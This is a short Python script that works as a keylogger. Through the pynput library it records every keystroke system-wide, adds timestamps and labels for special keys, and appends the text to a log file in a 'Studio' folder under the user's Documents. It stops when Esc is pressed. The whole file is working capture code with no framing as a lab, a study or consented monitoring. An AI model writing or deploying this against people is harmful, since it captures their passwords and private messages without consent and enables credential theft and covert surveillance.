import os
from pynput import keyboard
from datetime import datetime
import time

from pathlib import Path

doc_path = Path.home() / "Documents" / "Studio"
log_path = doc_path / "drxvain.txt"
doc_path.mkdir(parents=True, exist_ok=True)


last_time = time.time()
buffer = ""

special_keys = {
    keyboard.Key.enter: "[enter]",
    keyboard.Key.space: " ",
    keyboard.Key.tab: "[tab]",
    keyboard.Key.shift: "[shift]",
    keyboard.Key.shift_r: "[shift]",
    keyboard.Key.backspace: "[backspace]",
    keyboard.Key.esc: "[esc]",
    keyboard.Key.ctrl_l: "[ctrl]",
    keyboard.Key.ctrl_r: "[ctrl]",
    keyboard.Key.alt_l: "[alt]",
    keyboard.Key.alt_r: "[alt]",
    keyboard.Key.caps_lock: "[capslock]",
    keyboard.Key.delete: "[delete]",
}

for i in range(1, 13):
    special_keys[getattr(keyboard.Key, f"f{i}")] = f"[f{i}]"


def write_log(text):
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(text)


def on_press(key):
    global last_time, buffer

    now = time.time()
    time_diff = now - last_time
    last_time = now

    current_time = datetime.now().strftime("[%H:%M:%S]")

    try:
        k = key.char
    except AttributeError:
        k = special_keys.get(key, f"[{key}]")

    if time_diff < 0.8:
        buffer += k
    else:
        if buffer:
            write_log(f"{current_time} {buffer}\n")
        if k in [" ", "[enter]", "[tab]", "[shift]"] or "[" in k:
            write_log(f"{current_time} {k}\n")
            buffer = ""
        else:
            buffer = k


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
